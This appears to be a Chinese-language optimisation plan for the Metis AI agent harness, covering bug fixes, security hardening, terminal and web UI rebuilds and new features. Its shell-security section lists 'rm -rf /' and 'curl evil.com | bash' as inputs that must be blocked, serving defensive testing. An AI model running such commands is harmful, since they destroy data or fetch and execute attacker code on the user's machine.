# Metis Agent Harness 优化方案（完整版）

> 基于真实代码审计，非设计文档推测。按优先级分层，每项含具体改动点和验收标准。

---

## P0：真实 Bug 修复（1-2 天）

### B-1 CompletionClaim 中文枚举导致证据匹配失效
- **文件**: `metis/evidence/schema.py:28-32`
- **问题**: `CompletionClaim.GENERATED.value = "已生成"`，在 `matcher.py:89` 中 `if claim.value in text` 用中文匹配英文回复，永远 False
- **修复**: 枚举值改为英文（`"generated"`, `"ran"`, `"tested"`, `"uploaded"`, `"fixed"`），同时保留中文别名用于 `no_fake_completion` 质量门
- **验收**: 运行 `test_claim_evidence_matcher.py` + `test_claim_evidence_matcher_strict.py` 全通过

### B-2 max_turns 默认值不一致
- **文件**: `metis/runtime/response.py:44` 默认 20，其他 5 处默认 12
- **修复**: 统一为 12（在 `config.py` 中定义常量，全部引用）
- **验收**: grep 全局无硬编码 max_turns 数字

### B-3 Aurora/Sophia 适配器硬编码开发者路径
- **文件**: `metis/adapters/aurora.py:16`, `metis/adapters/sophia.py:15`
- **问题**: 硬编码 `D:\LATEXTEST\aurora-agent`，导致 4 个测试在任意机器必失败
- **修复**: 移除默认值，构造函数要求传入 project_root；测试改用 `tmp_path` fixture 创建临时目录
- **验收**: 481/481 测试全通过

### B-4 SYSTEM_ROOT_HINTS 误杀合法路径
- **文件**: `metis/security/paths.py:38`
- **问题**: `any(hint in lowered for hint in SYSTEM_ROOT_HINTS)` 子串匹配，`my-windows-app/src` 被误判
- **修复**: 改为路径段匹配 `any(hint in Path(resolved).parts for hint in ...)`
- **验收**: 添加测试：合法路径不被拒绝，`C:/Windows` 仍被拒绝

### B-5 _duplicate_tool_calls 去重 key 不一致
- **文件**: `metis/evals/runner.py:898-918`
- **问题**: 有 state 用 `(tool_name, args_json)`，无 state 用 `(tool_name, content)`
- **修复**: 统一为 `(tool_name, args_json)`，无 state 时从 messages 中提取 tool_call 的 arguments
- **验收**: 添加测试验证两种路径的去重结果一致

---

## P1：安全加固（3-5 天）

### S-1 run_shell 安全改造
- **文件**: `metis/tools/builtin.py:38`
- **问题**: `shell=True` 直接执行用户命令
- **修复**:
  - 保留 `run_shell` 但标记为 `SHELL_DANGEROUS`，默认禁用
  - 所有命令统一走 `run_command`（`shell=False`），解析命令为参数列表
  - ToolPolicyEngine 改为白名单模式：默认只允许 `ls, cat, head, tail, grep, find, wc, echo, python, pytest, git, npm, pip`
  - 白名单通过 `allowed_commands` 配置项扩展
- **验收**: `rm -rf /`, `curl evil.com | bash` 被拦截；`ls -la` 通过

### S-2 Web 服务安全
- **文件**: `metis/app/web.py`
- **修复**:
  - 添加 API Key 认证（环境变量 `METIS_WEB_API_KEY`，请求头 `X-API-Key`）
  - 添加 CORS 中间件（可配置 origins）
  - 添加速率限制（每 IP 每分钟 60 次请求）
  - 默认绑定 `0.0.0.0` 时强制要求设置 API Key
  - WebSocket 连接携带 token 参数认证
- **验收**: 无 key 请求返回 401；超速返回 429

### S-3 Prompt 注入检测增强
- **文件**: `metis/security/prompt_injection.py`
- **修复**:
  - 新增 10+ 模式：德语/法语忽略指令、base64 编码指令、角色扮演模板、多步注入
  - 新增 Unicode 规范化检测（同形字、软连字符、不可见运算符）
  - 明确文档标注此为"浅层检测"，非完整防护
- **验收**: 15+ 种注入测试用例通过

### S-4 凭据脱敏扩展
- **文件**: `metis/security/redaction.py`
- **修复**: 新增 AWS AKIA、GitHub ghp_/gho_、Slack xoxb-、连接字符串、URL 内嵌凭据模式
- **验收**: 10+ 种凭据格式测试通过

### S-5 SQLite 加固
- **文件**: `metis/state/sqlite_store.py`
- **修复**:
  - 添加外键约束（messages.session_id → sessions.id 等）
  - 添加索引（messages/session_id, tool_calls/session_id, evidence/session_id）
  - `_ensure_column` 改为参数化或白名单验证 table/column 名
  - 添加连接复用（threading.local 连接池）
- **验收**: 大数据量查询性能提升；无孤立记录

---

## P2：TUI 重建——对齐 Kimi Code 交互标准（5-7 天）

### 目标
将 39 行的 `input("> ")` + `print()` REPL 替换为基于 **Rich + prompt_toolkit** 的现代终端界面。

### UI-1 Rich 渲染引擎集成
- **新增依赖**: `rich>=13`, `prompt_toolkit>=3`
- **位置**: 新建 `metis/app/tui_rich.py`（替代旧 `tui.py`）
- **渲染能力**:
  - Markdown 渲染（代码块语法高亮、表格、列表）
  - Spinners（20+ 内置动画，tool 执行期间显示）
  - Panel/Bordered 区域（tool 结果、错误、证据各有独立视觉容器）
  - Live Display（实时更新的状态区域，不闪烁）
  - 树形结构（evidence 链、prompt 栈的可视化）
  - 进度条（多轮 turn 进度、token 预算消耗）

### UI-2 实时 Hook 驱动的状态显示
- **核心机制**: 订阅 HookBus 事件，驱动 Rich Live 渲染
- **事件 → UI 映射**:

| Hook 事件 | TUI 显示 |
|-----------|----------|
| `model.pre_call` | `⏳ Turn {n}/{max} — 思考中...` + Spinner |
| `model.post_call` | Token 用量实时更新（输入/输出/总计） |
| `tool.pre_dispatch` | `🔧 {tool_name}({args_preview})` + Spinner |
| `tool.post_dispatch` | `✅ {tool_name}` 或 `❌ {tool_name}: {failure_type}` |
| `tool.guardrail_block` | `🚫 被策略拦截: {reason}` 红色警告 |
| `context.compressed` | `📦 上下文压缩: {original}→{final} chars` |
| `schema.repair_hint` | `🔧 参数修复: {hint_types}` 黄色提示 |
| `quality.passed/failed` | 质量门结果折叠显示 |
| `finalization.result` | 验证状态徽标（verified/blocked/needs_more_work） |
| `evidence.recorded` | `📎 证据: {claim} [{strength}]` |

### UI-3 结构化输出展示
- **Agent 最终回复**: Rich Markdown 渲染（代码高亮、表格、链接可点击）
- **StrictOutput 解析结果**: 结构化展示 summary + evidence_refs + artifact_refs
- **final_verified 状态**: 页脚显示 `✓ 已验证` 或 `⚠ 未验证`
- **错误展示**: 面板形式，含 failure_type、repair_instruction、建议操作

### UI-4 交互功能
- **多行输入**: prompt_toolkit 支持粘贴多行、Shift+Enter 换行
- **斜杠命令**:

| 命令 | 功能 |
|------|------|
| `/help` | 显示所有命令 |
| `/status` | 当前 session 信息：profile、model、workspace、turns used、token 消耗 |
| `/tools` | 列出可用工具和权限状态 |
| `/evidence` | 当前 session 的证据链列表（claim → source → strength） |
| `/trace` | 最近一次运行的 trace_events 时间线 |
| `/profile [name]` | 切换执行 profile |
| `/clear` | 清屏 |
| `/history` | 会话消息历史 |
| `/cost` | 当前 session 的 token 消耗统计 |
| `/exit` | 退出 |

- **输入补全**: prompt_toolkit 自动补全斜杠命令和工具名
- **历史记录**: prompt_toolkit 内置历史，上下箭头浏览

### UI-5 信息面板布局
```
┌─ Metis Agent ──────────────────────────────────────────┐
│ Model: glm-4.7-flash  Profile: small  Turn: 3/12       │
│ Tokens: 1.2k in / 800 out  Evidence: 3 (2 strong)      │
└─────────────────────────────────────────────────────────┘

User: 帮我分析这个项目的测试覆盖率

⏳ Turn 1/12 — 思考中...

🔧 read_file({path: "tests/..."})                         ✅ 1.2s
🔧 run_command({command: ["pytest", "--co"]})              ✅ 3.1s
📎 证据: "测试文件共 48 个" [strong]

⏳ Turn 2/12 — 思考中...

Agent:
## 测试覆盖率分析

该项目共包含 **48 个测试文件**，覆盖以下模块：

| 模块 | 测试文件 | 测试数量 |
|------|----------|----------|
| runtime | 5 | 42 |
| tools | 8 | 67 |
| evals | 6 | 134 |

> 证据: read_file#tool_001, run_command#tool_002

✓ 已验证 | Tokens: 2.4k | Evidence: 3 claims, all strong

> │
```

### UI-6 优雅关机
- 注册 SIGINT/SIGTERM 处理器
- 收到信号时：保存当前 session 检查点到 SQLite，显示"正在保存..."，然后退出
- Ctrl+C 时：第一次按显示"按 Ctrl+C 再次退出"，第二次执行保存并退出
- 支持通过 `metis resume` 恢复中断的会话

---

## P3：Web UI 重建——对齐 Kimi Code + 远程访问（7-10 天）

### 设计目标
- 手机浏览器可访问，响应式布局
- 开箱即用，无需微信/第三方集成
- API Key 认证，绑定 `0.0.0.0` 即可远程访问
- 真正的流式输出（不再是伪流式）
- 展示 Metis 特有的证据链、质量门、trace 信息

### W-1 认证与远程访问
- **API Key 认证**:
  - 环境变量 `METIS_WEB_API_KEY`（必填时绑定 0.0.0.0）
  - 登录页面输入 API Key，存储在 localStorage
  - WebSocket 连接通过 query 参数 `?token=xxx` 认证
- **绑定地址**:
  - `metis web` 默认 `127.0.0.1:8080`（本地）
  - `metis web --host 0.0.0.0` 绑定所有接口（远程访问）
  - 绑定 0.0.0.0 时强制要求 API Key（否则拒绝启动）
- **HTTPS 支持**（可选）:
  - `metis web --ssl-certfile cert.pem --ssl-keyfile key.pem`
  - 或反向代理（文档说明 Nginx 配置）
- **响应式设计**:
  - 移动端适配：侧边栏折叠为汉堡菜单
  - 触摸优化：按钮 44px 最小点击区域
  - 代码块可横向滚动

### W-2 真正的流式架构
- **核心改动**: HookBus 事件 → SSE（Server-Sent Events）推送到前端
- **新增 SSE 端点**: `GET /api/chat/stream?session_id=xxx`（比 WebSocket 更适合单向流）
- **事件流设计**:

```
event: run.started
data: {"session_id":"...", "profile":"small", "max_turns":12}

event: turn.started
data: {"turn":1, "max_turns":12}

event: model.thinking
data: {"turn":1}

event: tool.call
data: {"turn":1, "tool":"read_file", "args_preview":"path=\"src/...\""}

event: tool.progress
data: {"turn":1, "tool":"read_file", "status":"running", "elapsed_ms":340}

event: tool.result
data: {"turn":1, "tool":"read_file", "status":"ok", "evidence_refs":["ev_001"]}

event: tool.error
data: {"turn":1, "tool":"run_shell", "failure_type":"policy_denied", "repair_hint":"使用 run_command 替代"}

event: evidence.recorded
data: {"id":"ev_001", "claim":"文件已读取", "source_type":"tool_output", "strength":"strong"}

event: context.compressed
data: {"original_chars":12000, "final_chars":8000, "ratio":0.67}

event: text.delta
data: {"text":"根据"}

event: text.delta
data: {"text":"分析"}

event: finalization.result
data: {"verified":true, "claims":3, "unverified":0}

event: run.completed
data: {"status":"final", "turns_used":3, "usage":{"input":2400,"output":800}}
```

- **实现方式**: 在 `AgentLoop.run()` 的 HookBus emit 点插入 SSE 发射逻辑，通过 asyncio.Queue 桥接

### W-3 前端界面重设计
- **技术栈**: 保持纯 HTML/CSS/JS（无构建工具，开箱即用）
- **布局**: 三栏式

```
┌──────────┬────────────────────────────┬──────────────┐
│ 侧边栏    │ 主对话区                    │ 信息面板      │
│           │                            │              │
│ [新对话]   │ User: 分析测试覆盖率         │ Profile:     │
│           │                            │ small        │
│ Session 1 │ 🔧 read_file → ✅           │              │
│ 3 msgs    │ 🔧 run_command → ✅         │ Evidence:    │
│           │ 📎 证据: 48个文件 [strong]   │ 3 claims     │
│ Session 2 │                            │ 2 strong     │
│ 1 msg     │ Agent:                     │ 1 medium     │
│           │ ## 分析结果                 │              │
│ ──模型──  │ 该项目包含 48 个测试文件...   │ Tokens:      │
│ GLM-4.7   │                            │ 2.4k / 800   │
│           │                            │              │
│ ──工具──  │ ✓ 已验证                    │ Timeline:    │
│ read_file │                            │ 8 events     │
│ write_file│                            │              │
│ run_cmd   │                            │ Quality:     │
│           │                            │ 6/6 passed   │
│           │                            │              │
│           │ ┌─────────────────────┐     │              │
│           │ │ 输入消息...    [发送] │     │              │
│           │ └─────────────────────┘     │              │
└──────────┴────────────────────────────┴──────────────┘
```

- **移动端**: 信息面板折叠为底部标签页（对话 / 证据 / 状态）

### W-4 前端功能清单
- **对话区**:
  - Markdown 渲染（marked.js + highlight.js 语法高亮）
  - 代码块复制按钮
  - Tool 调用折叠/展开（默认展开，点击折叠）
  - Evidence 引用高亮可点击（跳转到证据详情）
  - 打字机效果（text.delta 事件逐字显示）

- **侧边栏**:
  - Session 列表（含消息数、工具数、证据数）
  - 新建对话按钮
  - 模型和 Profile 显示
  - 可用工具列表

- **信息面板**（桌面端右侧，移动端底部标签页）:
  - **状态标签页**: Profile、Model、Workspace、Session ID
  - **证据标签页**: Evidence 链列表（claim → source → strength → resolved）
  - **Timeline 标签页**: trace_events 时间线（可折叠树形）
  - **Token 标签页**: 实时 token 消耗、每轮用量柱状图

### W-5 移动端适配
- **响应式断点**: 768px（平板/手机）
- **适配要点**:
  - 侧边栏 → 全屏覆盖式抽屉（左滑打开）
  - 信息面板 → 底部固定标签页栏（对话/证据/状态/设置）
  - 输入框 → 底部固定，支持语音输入（`<input type="text" speech>`）
  - Tool 调用 → 默认折叠，点击展开
  - 字体最小 14px，按钮最小 44px
  - 长按消息复制
  - 下拉刷新加载历史

---

## P4：工程质量（5-7 天）

### Q-1 引入 logging 框架
- **新建**: `metis/logging.py`
- **改动**: 所有 `print()` 替换为 `logger.info/warning/error`
- **日志级别**: `METIS_LOG_LEVEL` 环境变量控制（默认 WARNING）
- **格式**: `[{time}] [{level}] {module}: {message}`
- **验收**: `grep -r "print(" metis/ --include="*.py" | wc -l` 应为 0

### Q-2 统一配置模块
- **新建**: `metis/config.py`
- **内容**:
  ```python
  DEFAULT_MODEL = "glm-4.7-flash"
  DEFAULT_MAX_TURNS = 12
  DEFAULT_TEMPERATURE = 0.2
  DEFAULT_HOST = "127.0.0.1"
  DEFAULT_PORT = 8080
  DEFAULT_PROFILE = "small"
  # ... 所有散布的硬编码值集中到这里
  ```
- **验收**: grep 无散布的硬编码默认值

### Q-3 拆分超大文件
- `metis/evals/compare.py` (3219 行) → 5 个文件:
  - `compare.py` (核心比较逻辑)
  - `compare_loader.py` (数据加载)
  - `compare_regression.py` (回归分析)
  - `compare_format.py` (Markdown/JSON 格式化)
  - `repair_tasks.py` (修复计划 + 评测桩)
- `metis/adapters/cli.py` (1529 行) → 4 个文件:
  - `cli/parser.py` (参数解析)
  - `cli/eval_commands.py` (eval 相关命令)
  - `cli/package_commands.py` (package 相关命令)
  - `cli/main.py` (入口和路由)
- `metis/evals/runner.py` (1332 行) → 2 个文件:
  - `runner.py` (核心运行逻辑)
  - `runner_report.py` (报告生成)

### Q-4 重构 AgentLoop.run()
- 891 行 → 拆分为:
  - `_initialize_run()` — 初始化
  - `_execute_turn()` — 单轮执行
  - `_call_model()` — 模型调用
  - `_handle_tool_calls()` — 工具调用处理
  - `_handle_final_response()` — 终态处理
  - `_handle_run_error()` — 错误处理
- 每个子方法可独立测试

### Q-5 补充安全测试
- 当前仅 5 个安全测试 → 目标 30+
- 覆盖：命令注入绕过、路径遍历（符号链接）、凭据脱敏、插件恶意代码、策略强制执行

---

## P5：功能补全（2-3 周）

### F-1 Provider 多模型支持
- **新建**: `metis/providers/transport.py`（ProviderTransport 抽象层）
- **实现**:
  - `OpenAITransport` — 现有 OpenAI 兼容
  - `AnthropicTransport` — Claude 系列
  - `OllamaTransport` — 本地模型
  - `OpenRouterTransport` — 多模型路由
- **配置**: manifest 中 `provider_type` 字段或环境变量 `METIS_PROVIDER_TYPE`

### F-2 Streaming 流式输出
- **Provider 层**: 支持 `stream=True`，返回 `AsyncIterator[TokenDelta]`
- **AgentLoop 层**: 流式模式下游走 token 而非等待完整响应
- **Hook 新增**: `model.token_delta` 事件
- **TUI**: Rich Live 逐字显示
- **Web**: SSE `text.delta` 事件推送

### F-3 Memory 模块
- **新建**: `metis/memory/`
- `manager.py` — MemoryManager
- `sqlite_provider.py` — SQLite 持久化
- `fences.py` — 记忆边界控制
- 四类记忆: ConversationHistory, TaskState, LongTermMemory, ExperienceMemory
- PromptAssembler 的 `memory_context` 字段接入

### F-4 内置工具扩充
- 当前 5 个 → 目标 12+:
  - `list_files` — 目录列表
  - `search_files` — grep 搜索
  - `edit_file` — 精确编辑（非全量写入）
  - `http_request` — HTTP 请求
  - `web_fetch` — 网页抓取
  - `ask_user` — 向用户提问（HITL）
  - 保留现有: `read_file`, `write_file`, `run_shell`, `run_command`, `run_test`

### F-5 Swarm 增强
- TaskDecomposer 从固定模板 → 基于 LLM 的动态分解
- SwarmAnalyzer 从中文关键词 → 多语言意图识别
- Synthesizer 从机械拼合 → LLM 驱动的质量综合
- 添加 Durable Work Board（SQLite 持久化）
- 角色模板补全（input_contract, output_schema, quality_checks）

### F-6 ContextEngine 升级
- 从字符级截断 → token 级预算
- 三种模式: minimal / balanced / deep
- 语义摘要（调用模型压缩历史）
- 优先级保护（system prompt 永不被截断）
- 记忆召回注入

### F-7 Plugin 生命周期补全
- `uninstall()` — 执行 manifest 中的 uninstall_paths
- `update()` — 版本对比 + 热更新
- 依赖解析 — 插件间依赖图
- 安全边界 — 插件代码受限执行环境

---

## 时间线总览

| 阶段 | 内容 | 工期 | 依赖 |
|------|------|------|------|
| P0 | Bug 修复 | 1-2 天 | 无 |
| P1 | 安全加固 | 3-5 天 | 无 |
| P2 | TUI 重建 | 5-7 天 | P0, Q-1 |
| P3 | Web UI 重建 | 7-10 天 | P1, Q-1 |
| P4 | 工程质量 | 5-7 天 | P0 |
| P5 | 功能补全 | 2-3 周 | P0-P4 |

**串行关键路径**: P0 → P1 → P3（Web UI 需要安全基础）

**可并行**: P2（TUI）和 P4（工程质量）可在 P1 完成后并行推进

**总工期估算**: 5-6 周（全部完成），3-4 周（P0-P4 达到生产可用）

---

## 验收标准

### TUI 验收
- [ ] Tool 执行有实时 spinner + 名称 + 耗时
- [ ] Evidence 链实时展示
- [ ] Markdown + 语法高亮渲染
- [ ] Token 用量实时更新
- [ ] 10+ 个斜杠命令可用
- [ ] 多行输入和粘贴支持
- [ ] Ctrl+C 优雅退出并保存 session

### Web UI 验收
- [ ] 手机浏览器可正常访问和操作
- [ ] API Key 认证生效
- [ ] Tool 执行实时流式推送（非伪流式）
- [ ] 打字机效果（text.delta 逐字显示）
- [ ] Evidence 面板可查看证据链详情
- [ ] Timeline 面板可查看 trace_events
- [ ] 响应式布局：桌面三栏、移动端底部标签页
- [ ] 代码块语法高亮 + 复制按钮
- [ ] Session 历史持久化（刷新不丢失）

### 安全验收
- [ ] `run_shell` 默认禁用，`run_command` 白名单生效
- [ ] Web API Key 认证，无 key 返回 401
- [ ] 速率限制生效，超速返回 429
- [ ] Prompt 注入检测 15+ 模式覆盖
- [ ] 凭据脱敏 10+ 格式覆盖
- [ ] 30+ 安全测试全通过
